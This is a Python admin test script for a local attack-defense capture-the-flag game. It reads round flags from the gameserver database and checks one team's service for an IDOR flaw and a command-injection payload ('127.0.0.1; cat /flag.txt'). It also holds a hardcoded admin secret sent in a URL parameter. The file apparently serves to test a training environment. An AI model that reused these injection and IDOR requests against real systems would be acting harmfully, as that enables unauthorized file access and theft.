#!/usr/bin/env python3
import sys
import os
import sqlite3
import requests
import json

# Configuration
GAMESERVER_DB = "gameserver/data/gameserver.db"
GAMESERVER_URL = "http://localhost:8000"
TEAM1_URL = "http://localhost:8001"
TEAM2_URL = "http://localhost:8002"
ADMIN_SECRET = "SuperSecretAdminKey1337!"

def print_header(title):
    print("\n" + "="*60)
    print(f" {title} ".center(60, "="))
    print("="*60)

def view_current_flags():
    print_header("CURRENT ROUND ACTIVE FLAGS (FROM GAMESERVER DB)")
    if not os.path.exists(GAMESERVER_DB):
        print(f"[ERROR] Gameserver database not found at {GAMESERVER_DB}")
        print("Please make sure the gameserver container has run and initialized the DB.")
        return
        
    try:
        conn = sqlite3.connect(GAMESERVER_DB)
        cursor = conn.cursor()
        
        # Get current round
        cursor.execute("SELECT value FROM game_state WHERE key = 'current_round'")
        row = cursor.fetchone()
        if not row:
            print("[WARN] Game has not started yet (Round is 0).")
            conn.close()
            return
            
        current_round = int(row[0])
        print(f"Active Game Round: {current_round}")
        
        # Query flags for the current round
        cursor.execute("""
            SELECT flag_logs.team_id, teams.display_name, flag_logs.flag_type, flag_logs.flag_value 
            FROM flag_logs 
            JOIN teams ON flag_logs.team_id = teams.id 
            WHERE flag_logs.round = ?
        """, (current_round,))
        
        rows = cursor.fetchall()
        if not rows:
            print(f"[WARN] No flags generated for Round {current_round} yet.")
        else:
            print(f"{'TEAM NAME':<15} | {'FLAG TYPE':<10} | {'FLAG VALUE'}")
            print("-" * 60)
            for team_id, name, flag_type, val in rows:
                print(f"{name:<15} | {flag_type:<10} | {val}")
                
        conn.close()
    except Exception as e:
        print(f"[ERROR] Failed to query database: {e}")

def test_exploit_mechanics():
    print_header("VULNERABILITIES EXPLOIT TEST (DIAGNOSTIC CHECKS)")
    
    # 1. Test Team 2's IDOR vulnerability
    print("\n[*] Testing IDOR Vulnerability on Team 2 (Port 8002)...")
    try:
        session = requests.Session()
        # Register a test account on Team 2
        reg_r = session.post(f"{TEAM2_URL}/register", data={"username": "test_agent_idor", "password": "password123"}, timeout=3)
        login_r = session.post(f"{TEAM2_URL}/login", data={"username": "test_agent_idor", "password": "password123"}, timeout=3)
        
        # Access message ID 1 (IDOR)
        idor_r = session.get(f"{TEAM2_URL}/api/message/1", timeout=3)
        if idor_r.status_code == 200 and "FLAG" in idor_r.text:
            print(f"[SUCCESS] Team 2 is VULNERABLE to IDOR!")
            print(f"          Stolen DB Flag: {idor_r.json().get('message')}")
        else:
            print(f"[PATCHED/BLOCKED] IDOR test failed (Status: {idor_r.status_code}).")
    except Exception as e:
        print(f"[CONNECTION ERROR] Failed to connect to Team 2: {e}")

    # 2. Test Team 2's Command Injection (RCE)
    print("\n[*] Testing Command Injection (RCE) on Team 2 (Port 8002)...")
    try:
        rce_r = session.post(f"{TEAM2_URL}/api/network_check", data={"target": "127.0.0.1; cat /flag.txt"}, timeout=3)
        if rce_r.status_code == 200 and "FLAG" in rce_r.text:
            print(f"[SUCCESS] Team 2 is VULNERABLE to Command Injection!")
            # Extract flag from output console
            output = rce_r.json().get("output", "")
            flag_line = [line for line in output.split('\n') if "FLAG" in line]
            print(f"          Stolen File Flag: {flag_line[0] if flag_line else output}")
        else:
            print(f"[PATCHED/BLOCKED] Command Injection test failed.")
    except Exception as e:
         print(f"[CONNECTION ERROR] Failed to connect to Team 2: {e}")

def simulate_flag_submission():
    print_header("SIMULATE TEAM FLAG SUBMISSION")
    if not os.path.exists(GAMESERVER_DB):
         print("[ERROR] Gameserver database not found.")
         return
         
    try:
        conn = sqlite3.connect(GAMESERVER_DB)
        cursor = conn.cursor()
        
        # Get current round
        cursor.execute("SELECT value FROM game_state WHERE key = 'current_round'")
        curr_round = int(cursor.fetchone()[0])
        
        # Find a valid flag belonging to Team 2 (Target) in the database
        cursor.execute("SELECT flag_value FROM flag_logs WHERE team_id = 2 AND round = ? LIMIT 1", (curr_round,))
        row = cursor.fetchone()
        if not row:
            print("[WARN] No active flags generated for Team 2 in the database. Start the game first.")
            conn.close()
            return
            
        target_flag = row[0]
        print(f"[INFO] Found active Team 2 flag: {target_flag}")
        print("[*] Submitting Team 2 flag on behalf of Team 1...")
        
        # Submit to Gameserver API using Team 1 login session
        session = requests.Session()
        session.post(f"{GAMESERVER_URL}/login", data={"username": "team1", "password": "teampassword1"})
        submit_r = session.post(f"{GAMESERVER_URL}/submit", data={"flag": target_flag})
        
        if "Gained +" in submit_r.text:
            print("[SUCCESS] Flag submitted successfully! Team 1 scored points.")
        elif "already scored" in submit_r.text:
            print("[WARN] Flag was already submitted previously.")
        else:
            print(f"[FAILED] Submission failed or returned unexpected response.")
            
        conn.close()
    except Exception as e:
        print(f"[ERROR] Simulation failed: {e}")

def force_round_tick():
    print_header("FORCE NEXT ROUND TICK")
    url = f"{GAMESERVER_URL}/admin"
    try:
        r = requests.post(url, data={"action": "force_tick"}, params={"secret": ADMIN_SECRET}, timeout=5)
        if r.status_code == 200:
            print("[SUCCESS] Round tick triggered successfully!")
        else:
            print(f"[FAILED] HTTP Status: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")

def main():
    print("============================================================")
    print("           Cyber Black Market Admin Test Utility            ")
    print("============================================================")
    print("1. View current round active flags")
    print("2. Test exploit mechanics (Run diagnostic attack tests)")
    print("3. Simulate Team 1 submitting Team 2's flag")
    print("4. Force next game round tick")
    print("5. Exit")
    print("============================================================")
    
    choice = input("Enter choice (1-5): ").strip()
    if choice == "1":
        view_current_flags()
    elif choice == "2":
        test_exploit_mechanics()
    elif choice == "3":
        simulate_flag_submission()
    elif choice == "4":
        force_round_tick()
    else:
        print("Exiting test tool.")
        sys.exit(0)

if __name__ == "__main__":
    main()
